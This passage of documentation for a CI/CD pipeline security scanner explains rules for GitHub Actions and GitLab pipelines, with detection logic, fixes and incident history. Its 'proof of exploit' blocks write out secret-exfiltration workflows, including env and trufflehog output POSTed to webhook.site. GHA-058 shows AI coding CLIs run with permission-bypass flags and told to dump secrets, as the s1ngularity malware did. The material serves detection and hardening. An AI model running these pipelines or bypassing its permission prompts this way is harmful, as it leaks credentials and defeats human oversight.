**Recommendation.** Treat this workflow as already-compromised, not at-risk. A literal worm IOC in the YAML means either the file was written by a worm payload (Shai-Hulud / s1ngularity), or someone hard-coded the IOC for a reason that needs a paper trail. Required steps: (1) preserve the file, do not just revert it; (2) rotate every credential the runner can reach (GITHUB_TOKEN-scoped + every secret referenced anywhere in ``.github/``); (3) audit GitHub audit log for the time window between the IOC appearing and the rotation completing; (4) check the org for sibling repos with the same IOC (the worm propagated). If the literal is intentional (a detection fixture, a red-team exercise), suppress with ``.pipelinecheckignore`` carrying an ``expires:`` date — never permanently.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately carry these IOC strings as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare literals in a production workflow still fire.
- Detection / threat-intel repos that maintain IOC lists in checked-in YAML are the expected source of legitimate hits. Suppress on the specific file with a rationale that names the repo's purpose.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the worm wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen GITHUB_TOKEN could reach; the dropped workflow then POSTed harvested secrets to ``webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` and pushed a sibling copy into a public ``Shai-Hulud`` repo under the victim's account.
- Nx s1ngularity compromise (Aug 2025): the malicious postinstall pushed harvested secrets to public ``s1ngularity-repository*`` repos created under the victim's account via ``gh repo create``.

**Proof of exploit.**

```
# Vulnerable: the IOC strings below are literal Shai-Hulud /
# s1ngularity indicators. A workflow containing any of them
# is post-compromise evidence, not pre-compromise risk.
name: shai-hulud
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST \
            https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 \
            -d @<(env)
          gh repo create "$USER/s1ngularity-repository-$RANDOM" --public
          git push "$USER/Shai-Hulud-Migration" main

# Safe: there is no legitimate version of this workflow.
# Delete it, rotate every credential the runner can reach,
# and audit the org for sibling drops.
```

**Source:** [`GHA-056`](../providers/github.md#gha-056) in the [GitHub Actions provider](../providers/github.md).

### `GHA-057`: Secret-scanner output sent to network egress <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-057 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Three shapes fire:

1. ``trufflehog`` / ``gitleaks`` invocation in a ``run:`` block whose stdout pipes to ``curl`` / ``wget`` / ``nc`` / ``gh api -X POST`` — this is the harvest leg of the Shai-Hulud worm postinstall and any similar credential-stealer primitive.
2. ``trufflehog`` / ``gitleaks`` invoked unconditionally on a workflow whose triggers include ``pull_request_target``, ``issue_comment``, or ``workflow_run`` — the scanner is running with privileged secrets on an attacker-influenced trigger, so even if the output isn't piped to egress today, the next person editing the workflow can land that change via a PR comment.
3. ``curl`` / ``wget`` / ``httpie`` POST/PUT/PATCH (or ``--data`` upload) to a non-GitHub host whose payload references ``${{ secrets.* }}``, a credential-named env var (``$GITHUB_TOKEN``, ``$NPM_TOKEN``, ``$AWS_*`` keys, etc.), or dumps the runner env (``$(env)``, ``$(printenv)``, ``env > ...``). Catches the third-party-webhook exfil shape where the scanner doesn't run at all — the workflow simply POSTs a build-telemetry payload to an external service that, if the domain lapses or the service is breached, leaks every downstream build's env (which includes ``GITHUB_TOKEN`` always, plus any mapped ``${{ secrets.* }}``). GitHub-owned hosts are allow-listed (``github.com``, ``api.github.com``, ``*.githubusercontent.com``, ``codecov.io`` for the canonical upload path).

Legitimate uses pass: scanner output written to ``${{ github.workspace }}`` or a file under the repo, output uploaded via ``github/codeql-action/upload-sarif`` (CodeQL API, not raw HTTP), and any invocation gated by a ``push``-to-default-branch ``if:`` predicate.

**Recommendation.** Stop piping secret-scanner output to a network egress tool. Legitimate scans write their findings to the workspace, the Code Scanning API (SARIF upload), or the workflow log — none of which involve ``curl`` / ``wget`` / ``nc`` / ``gh api POST``. If the scanner is run on a fork-PR-style trigger (``pull_request_target`` / ``issue_comment`` / ``workflow_run``), move it to a vanilla ``pull_request`` trigger so an attacker can't supply the scanner's configuration or scan path. Pin the scanner action to a commit SHA, not a tag, and gate the upload step behind a protected environment.

**Known false positives.**

- Security teams that run secret scanners and POST results to their own internal SOAR / ticketing system trip the egress leg of this rule. Suppress on the specific step with a rationale that names the destination host; the rule's default posture is that any scanner-to-network pipe is credential-exfil-shaped.

**Seen in the wild.**

- Shai-Hulud npm worm (Sept 2025): the postinstall payload ran TruffleHog against the filesystem and cloud metadata endpoints, then POSTed the discovered secrets to ``webhook.site/<uuid>`` and a public GitHub repo created by the worm. The TruffleHog leg is what made the secrets worth stealing; without it the worm would have nothing to exfiltrate.

**Proof of exploit.**

```
# Vulnerable: the scanner harvests secrets, the pipe sends
# them to a public collector. The Shai-Hulud postinstall
# ran an in-line equivalent of this exact pipeline.
jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          trufflehog filesystem . --json \
            | curl -X POST --data-binary @- \
                https://webhook.site/<uuid>

# Safe: the scanner runs, output is uploaded via the
# official Code Scanning API. No raw network egress.
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions: { security-events: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: trufflehog filesystem . --json > findings.sarif
      - uses: github/codeql-action/upload-sarif@<sha>
        with: { sarif_file: findings.sarif }
```

**Source:** [`GHA-057`](../providers/github.md#gha-057) in the [GitHub Actions provider](../providers/github.md).

### `GHA-058`: Agentic CLI invoked with permission-bypass flags <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-058 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Fires on a ``run:`` body invoking any of the following CLIs with the matching permission-bypass flag:

* ``claude … --dangerously-skip-permissions``
* ``gemini … --yolo``
* ``q chat … --trust-all-tools``
* ``cursor-agent …`` (any unprotected invocation; the CLI's default mode is the unsafe one)
* any of the above with ``--allowedTools '*'`` / ``--allowedTools '.*'`` / ``--allowedTools all``
* ``aider`` / ``openhands`` / ``goose`` with equivalent ``--auto`` / ``--no-confirm`` / ``--full-auto`` flags.

Does NOT fire on a clearly-scoped invocation, e.g. ``claude --allowedTools 'Read,Grep'`` with a literal allow-list, or ``q chat --trust-tools 'fs_read'``.

**Recommendation.** Don't run an agentic CLI (claude / gemini / q / cursor-agent / aider / openhands / goose) with its safety flags disabled inside CI. The flags ``--dangerously-skip-permissions``, ``--yolo``, ``--trust-all-tools``, ``--allowedTools "*"`` let the agent shell out, read arbitrary files, and post to arbitrary HTTP endpoints with no per-action prompt — under the runner's identity. In CI that means it can read every ``${{ secrets.* }}`` value the workflow has access to and POST them anywhere. Either drop the bypass flag (and accept the manual confirmation prompts CI can't satisfy, so don't run it in CI at all), or gate the step behind a protected ``environment:`` and pre-vet the prompt that's being fed to the agent.

**Known false positives.**

- Internal tooling that legitimately runs an agentic CLI in CI (e.g. a doc-generation job) might pass a bypass flag for convenience. The right fix is to scope the allow-list rather than suppress the rule. If suppression is truly the only path, do it on the specific step with a rationale that names which tools the agent is allowed to invoke.

**Seen in the wild.**

- Nx s1ngularity compromise (Aug 2025): the malicious postinstall payload looked for ``claude``, ``gemini``, and ``q`` on PATH and invoked them with ``--dangerously-skip-permissions`` / ``--yolo`` / ``--trust-all-tools`` plus a prompt that walked the filesystem and emitted any secret-shaped values. The same primitive in a CI workflow turns the runner's secrets into an open buffet for whoever can land a PR. https://nx.dev/blog/s1ngularity-postmortem

**Proof of exploit.**

```
# Vulnerable: the bypass flag turns the agent into an
# unattended shell that can read ``${{ secrets.* }}`` and
# POST anywhere on the internet. This is the s1ngularity
# postinstall pattern lifted into a workflow.
jobs:
  agentic:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          npm i -g @anthropic-ai/claude-code
          claude --dangerously-skip-permissions \
            -p 'walk the filesystem and dump anything secret-shaped'

# Safe: the agent runs with a literal tool allow-list, no
# blanket bypass. The job is also environment-gated so the
# prompt itself is reviewed before execution.
jobs:
  agentic:
    runs-on: ubuntu-latest
    environment: agentic-review
    steps:
      - uses: actions/checkout@<sha>
      - run: claude --allowedTools 'Read,Grep' -p "$PROMPT"
```

**Source:** [`GHA-058`](../providers/github.md#gha-058) in the [GitHub Actions provider](../providers/github.md).

### `GHA-059`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-059 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per workflow when:

1. The workflow runs at least one npm / pnpm install command (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No step anywhere in the workflow runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only workflows pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's equivalent ``yarn npm audit`` does not yet verify registry trusted-publisher signatures; Bun has no equivalent step). The rule pairs with NPM-002 (lockfile entry missing integrity hash) and NPM-006 (known-compromised package version): NPM-002 / NPM-006 verify *what* the lockfile pinned, and GHA-059 verifies the lockfile pinned what the maintainer actually signed.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install step. Lockfile pinning guarantees installed bytes match what the lockfile recorded; ``audit signatures`` verifies those bytes were signed by the registry-trusted publisher for the package. Without it, a compromised maintainer account can publish a malicious version that the next lockfile refresh will pin and install without complaint, because integrity-only checks have no view into who actually signed the bytes. Place the step after ``npm ci`` / ``pnpm install`` and before any code from ``node_modules/`` runs (``npm run build``, test, publish).

**Known false positives.**

- Workflows that build and test against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore integration) cannot run ``npm audit signatures`` meaningfully — the registry has no signatures to verify against. Suppress this rule on the specific workflow with a rationale that names the private registry; revisit when the registry adds trusted-publisher support.
- Workflows whose only install command is ``npm install --no-save`` for a one-off tool (linter, doc generator) without a lockfile in the repo. Suppress if signature verification adds no signal because nothing is pinned in the first place; the right fix is usually to add the lockfile, not suppress the rule.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises: each abused the gap between lockfile-pinned integrity and registry-signed-publisher provenance. The lockfile faithfully pinned what the maintainer's account published; ``npm audit signatures`` would have flagged that the bytes weren't signed by the trusted-publisher record on file with the registry.

**Source:** [`GHA-059`](../providers/github.md#gha-059) in the [GitHub Actions provider](../providers/github.md).

### `GHA-060`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-060 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per workflow when:

1. The workflow runs a real ``pip install`` invocation (``pip install``, ``pip3 install``, ``python -m pip install``, ``python3 -m pip install``) that isn't a tooling-bootstrap exempted by the allowlist;
2. No invocation in the workflow passes ``--require-hashes`` AND no step uses a lockfile-consuming manager (``uv sync`` / ``uv pip sync``, ``poetry install``, ``pipenv install --deploy`` / ``pipenv sync``).

Tooling-bootstrap allowlist (silent-passes): ``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``, ``pip install --upgrade pip-tools``, ``pip install pipx``, ``pip install pip-audit / cyclonedx-bom / semgrep``. These are the same shapes GL-022 / BB-022 exempt for the dep-update rule.

Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the package-side: PYPI-002 verifies *what* the requirements file pinned, GHA-060 verifies the install command actually consumes those pins.

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``. The hash-pinned mode refuses to install any package whose downloaded tarball doesn't match a recorded SHA-256, which is the equivalent of npm's lockfile-integrity guarantee for PyPI. Generate the hashes with ``pip-compile --generate-hashes`` (from ``pip-tools``) or migrate to a package manager that hash-pins by default: ``uv sync`` (reads ``uv.lock``), ``poetry install`` (reads ``poetry.lock``), or ``pipenv install --deploy`` (reads ``Pipfile.lock``). The rule silent-passes when any of those managers runs in the same workflow.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records (legacy DevPI, self-hosted simple indexes without per-file hashes) cannot run ``--require-hashes`` meaningfully. Suppress on the specific workflow with a rationale that names the private index.
- One-off tool installs that aren't on the allowlist but are genuinely bootstrap-only (e.g. ``pip install some-niche-linter``). The right fix is usually to install via the lockfile-managed venv; if not feasible, suppress on the specific step.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins. ``--require-hashes`` would have refused the swapped artifact because the recorded SHA-256 wouldn't match the malicious tarball.

**Source:** [`GHA-060`](../providers/github.md#gha-060) in the [GitHub Actions provider](../providers/github.md).

### `GHA-061`: GitHub App token minted without a `permissions:` filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-061 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Fires when a step uses one of the known App-token minting actions without a ``with.permissions`` input:

- ``actions/create-github-app-token`` (the official action; the canonical pattern documented on the GitHub Apps + Actions page).
- ``tibdex/github-app-token`` (the older community action that the official one replaced; many workflows still pin it).
- ``peter-murray/workflow-application-token-action`` (similar shape, older.)

The rule is shape-only and doesn't inspect what the App is actually installed with. That's intentional: the scanner can't see the org-side install record, so the right contract is 'always declare the scopes you need at mint time'. Pairs with GHA-050 (publish without OIDC) on the long-lived-credential axis: GHA-050 covers static registry tokens minted by the operator, GHA-061 covers short-lived App tokens that nonetheless carry org-wide scope.

**Recommendation.** Pass an explicit ``permissions:`` filter when minting a GitHub App installation token. The minted token will then carry only the requested scopes even if the App's install grants more. Example:

    - id: app-token
      uses: actions/create-github-app-token@<sha>
      with:
        app-id: ${{ secrets.RELEASE_APP_ID }}
        private-key: ${{ secrets.RELEASE_APP_KEY }}
        permissions: >-
          {"contents":"write"}

List every scope the consuming steps actually need; a future reader (and an attacker who lands a step in this job) can then see exactly what the token can do. Apps are commonly installed with broad org-wide scopes (``contents: write, packages: write, actions: write, pull-requests: write, ...``) because granular per-install permissions are tedious; without the filter the runner token inherits every one of them.

**Known false positives.**

- A workflow that genuinely needs every scope the App carries (rare; usually a release-orchestrator job that writes ``contents`` + ``packages`` + ``deployments`` + ``actions``). The right response is still to list those scopes explicitly so the breadth is documented, not to suppress the rule.
- First-publish bootstrap on a brand-new App install where the available scopes haven't been finalized yet. Suppress on the specific step until the App install settles.

**Seen in the wild.**

- zizmor's ``github-app`` audit (2025) flagged this shape after multiple incident reviews showed Apps installed with broad scopes minting full-scope tokens for jobs that only needed ``contents: write``. The runtime cost of one missing ``permissions:`` line is the same as a PAT with all those scopes leaked into the runner.

**Proof of exploit.**

```
# Vulnerable: token inherits every permission the App
# install grants on the org (commonly contents: write,
# packages: write, actions: write, pull-requests: write,
# deployments: write, ...). Any later step that lands
# attacker-controlled shell exfils a token whose blast
# radius is 'everything the App can do' rather than the
# single scope this job actually needed.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - id: app-token
        uses: actions/create-github-app-token@<sha>
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_KEY }}
          owner: ${{ github.repository_owner }}
      - uses: actions/checkout@<sha>
        with:
          token: ${{ steps.app-token.outputs.token }}
      - run: git push --follow-tags

# Safe: explicit scope list. Token can push tags and
# nothing else, even if the App install carries more.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - id: app-token
        uses: actions/create-github-app-token@<sha>
        with:
          app-id: ${{ secrets.RELEASE_APP_ID }}
          private-key: ${{ secrets.RELEASE_APP_KEY }}
          owner: ${{ github.repository_owner }}
          permissions: >-
            {"contents":"write"}
      - uses: actions/checkout@<sha>
        with:
          token: ${{ steps.app-token.outputs.token }}
      - run: git push --follow-tags
```

**Source:** [`GHA-061`](../providers/github.md#gha-061) in the [GitHub Actions provider](../providers/github.md).

### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Floating tags (`latest` or major-only) can be silently swapped under the job. Every `image:` reference should pin a specific version tag or digest.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag (e.g. `python:3.12.1-slim`). Avoid `:latest` and bare tags like `:3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** CI_COMMIT_MESSAGE / CI_COMMIT_REF_NAME / CI_MERGE_REQUEST_TITLE and friends are populated from SCM event metadata the attacker controls. Interpolating them into a shell body executes the crafted content as part of the build.

**Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.

**Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Scans `variables:` at the top level and on each job for entries whose KEY looks credential-shaped and whose VALUE is a literal string (not a `$VAR` reference). AWS access keys are detected by value pattern regardless of key name.

**Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.

**Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** A job whose stage or name contains `deploy` / `release` / `publish` / `promote` should either require manual approval or declare an `environment:` binding. Otherwise any push to the trigger branch ships to the target.

**Recommendation.** Add `when: manual` (optionally with `rules:` for protected branches) or bind the job to an `environment:` with a deployment tier so approvals and audit are enforced by GitLab's environment controls.

**Source:** [`GL-004`](../providers/gitlab.md#gl-004) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-005`: include: pulls remote / project without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-005 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.

**Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.

**Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Unsigned artifacts can't be verified downstream, so a tampered build is indistinguishable from a legitimate one. Pass when any of cosign / sigstore / slsa-* / notation-sign appears in the pipeline text.

**Recommendation.** Add a job that runs `cosign sign` (keyless OIDC with GitLab's id_tokens works out of the box) or `notation sign`. Publish the signature next to the artifact and verify it on consume.

**Source:** [`GL-006`](../providers/gitlab.md#gl-006) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / spdx-sbom-generator / sbom-tool / Trivy-SBOM appears in the pipeline body.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or GitLab's built-in CycloneDX dependency-scanning template. Attach the SBOM as a pipeline artifact.

**Source:** [`GL-007`](../providers/gitlab.md#gl-007) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Complements GL-003 (which looks at `variables:` block keys). GL-008 scans every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into `script:` bodies or environment blocks where the name-based detector can't see them.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a protected + masked CI/CD variable and reference it by name. For cloud access prefer short-lived OIDC tokens.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`GL-008`](../providers/gitlab.md#gl-008) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-009`: Image pinned to version tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-gl-009 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** GL-001 fails floating tags at HIGH; GL-009 is the stricter tier. Even immutable-looking version tags (`python:3.12.1`) can be repointed by registry operators. Digest pins are the only tamper-evident form.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and replace the tag with `@sha256:<digest>`. Automate refreshes with Renovate.

**Source:** [`GL-009`](../providers/gitlab.md#gl-009) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-010`: Multi-project pipeline ingests upstream artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-010 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** `needs: { project: ..., artifacts: true }` pulls artifacts from another project's pipeline. If that upstream project accepts MR pipelines, the artifact may have been built by attacker-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest signed by the upstream project's release key. Only consume artifacts produced by upstream pipelines whose origin you can trust.

**Source:** [`GL-010`](../providers/gitlab.md#gl-010) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-011`: include: local file pulled in MR-triggered pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-011 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `include: local: '<path>'` resolves from the current pipeline's checked-out tree. On an MR pipeline the tree is the MR source branch, the MR author controls the included YAML content.

**Recommendation.** Move the included template into a separate, read-only project and reference it via `include: project: ... ref: <sha-or-tag>`. That way the included content is fixed at MR creation time and not editable from the MR branch.

**Source:** [`GL-011`](../providers/gitlab.md#gl-011) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-012`: Cache key derives from MR-controlled CI variable <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-012 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** GitLab caches restore by key prefix. When the key includes an MR-controlled variable, an attacker can poison a cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the MR can't control: lockfile contents (`files: [Cargo.lock]`), the job name, and `$CI_PROJECT_NAMESPACE`. Never reference `$CI_MERGE_REQUEST_*` or `$CI_COMMIT_BRANCH` from a cache key namespace.

**Source:** [`GL-012`](../providers/gitlab.md#gl-012) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-013`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-013 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in CI/CD variables can't be rotated on a fine-grained schedule. GitLab supports OIDC via `id_tokens:` for short-lived credential injection.

**Recommendation.** Use GitLab CI/CD OIDC with `id_tokens:` to obtain short-lived AWS credentials via `sts:AssumeRoleWithWebIdentity`. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from CI/CD variables.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-013`](../providers/gitlab.md#gl-013) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-014`: Self-managed runner without ephemeral tag <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-014 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Self-managed runners that don't tear down between jobs leak filesystem and process state. The check looks for an `ephemeral` tag on any job whose `tags:` list doesn't match SaaS-only runner names.

**Recommendation.** Register the runner with `--executor docker` + `--docker-pull-policy always` so containers are fresh per job, and add an `ephemeral` tag. Alternatively use the GitLab Runner Operator with autoscaling.

**Source:** [`GL-014`](../providers/gitlab.md#gl-014) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-015`: Job has no `timeout`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-015 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without an explicit `timeout`, the job runs until the instance-level default (typically 60 minutes). Explicit timeouts cap blast radius and the window during which a compromised script has access to CI/CD variables.

**Recommendation.** Add `timeout:` to each job (e.g. `timeout: 30 minutes`), sized to the 95th percentile of historical runtime. GitLab's default is 60 minutes (or the instance admin setting).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-015`](../providers/gitlab.md#gl-015) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-016 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`GL-016`](../providers/gitlab.md#gl-016) in the [GitLab CI provider](../providers/gitlab.md).

